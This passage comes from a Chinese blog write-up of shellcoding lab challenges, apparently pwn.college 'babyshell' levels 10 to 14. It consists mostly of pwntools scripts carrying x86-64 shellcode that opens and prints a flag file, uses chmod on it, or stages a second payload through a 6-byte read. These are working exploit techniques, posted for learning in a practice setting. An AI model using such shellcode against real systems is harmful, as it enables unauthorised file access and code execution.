    mov byte ptr [rsp+1], 0x66
    nop
    xchg eax, ebx
    xchg eax, ebx
    mov byte ptr [rsp+2], 0x6c
    nop
    xchg eax, ebx
    xchg eax, ebx
    mov byte ptr [rsp+3], 0x61
    nop
    xchg eax, ebp
    xchg eax, ebp
    mov byte ptr [rsp+4], 0x67
    nop
    xchg eax, ebp
    xchg eax, ebp
    mov byte ptr [rsp+5], 0x00
    nop
    xchg eax, esi
    xchg eax, esi
    push rsp
    pop rdi
    mov al, 2
    syscall
    xchg eax, edi
    xchg eax, edi

// read:
    mov rdi, rax
    mov rsi, rsp
    xchg eax, edi
    xchg eax, edi
    mov dl, 0x50
    nop
    nop
    xor rax, rax
    xchg eax, edi
    xchg eax, edi
    syscall


// write:
    mov rdx, rax
    test eax, eax
    xor rdi, rdi
    mov rdi, r9
    test eax, eax
    mov rsi, rsp
    mov al, 0
    inc rax
    syscall

    mov rdi, rax
    inc rax
    mov al, 3
    
    syscall
    nop
    inc rax
&#39;&#39;&#39;

hex_shellcode = asm(shellcode)
# p = gdb.debug(&#39;./level9_chall_cp&#39;,&#39;b *main\nb *main + 912&#39;)
p = process(&#39;./level10_chall&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
# p.send(hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>不能重复，这里就用chmod那个打法</p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
shellcode = &#39;&#39;&#39;
    mov al, 0x5a
    mov sil, 7
    push 0x66     
    // f
    push rsp
    pop rdi
    syscall
&#39;&#39;&#39;
p = process(&#39;/challenge/babyshell_level13&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,asm(shellcode))
p.interactive()
</code></pre>
<h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>前面的exp可以打通，这里不是很理解为什么没有write还可以push和pop</p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
shellcode = &#39;&#39;&#39;
    mov al, 0x5a
    mov sil, 7
    push 0x66     
    // f
    push rsp
    pop rdi
    syscall
&#39;&#39;&#39;
p = process(&#39;/challenge/babyshell_level13&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,asm(shellcode))
p.interactive()
# 即使栈没有写权限，还是可以push和pop
</code></pre>
<h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p>6字节，这里只能read，调试利用已有的寄存器，<code>fd = 1</code>即可接着写入shellcode</p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;, terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;],log_level=&#39;debug&#39;)
shellcode = &#39;&#39;&#39;
    xor edi, edi
    mov esi, edx
    syscall
&#39;&#39;&#39;
# p = process(&#39;/challenge/babyshell_level14&#39;)
# p = gdb.debug(&#39;/challenge/babyshell_level14&#39;,&#39;b *main + 634&#39;)
p = gdb.debug(&#39;./level14_chall&#39;,&#39;b* main + 674&#39;)
p.sendafter(&#39;Reading 0x6 bytes from stdin.\n&#39;,asm(shellcode))
shellcode = &#39;&#39;&#39;
//  open
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    mov rbx, 0x0067616c662f
    mov rsi, 0
    mov rdx, 0
    mov al, 2
    push rbx
    push rsp
    pop rdi
    syscall

// read
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    mov rax, 0
    syscall

// write
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov rax, 1
    syscall
&#39;&#39;&#39;
p.send(asm(shellcode))
p.interactive()
</code></pre>

    </div>
    
</div>
                         
<footer id="footer">
    <div class="footer-wrap">
        <div>
            © 20xx - 2024 Moyao の小屋
            <span class="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            @Moyao
        </div>
        <div></div>
        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
        
    </div>
</footer>
                    </div>
                </div>
            </transition>
            <div id="img_show">
                <img id="img_content" alt="img_show">
            </div>
        </div>
        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
        <script src="/js/particlex.js"></script>
        <script src="/js/showimg.js"></script>
        

    </body>
</html>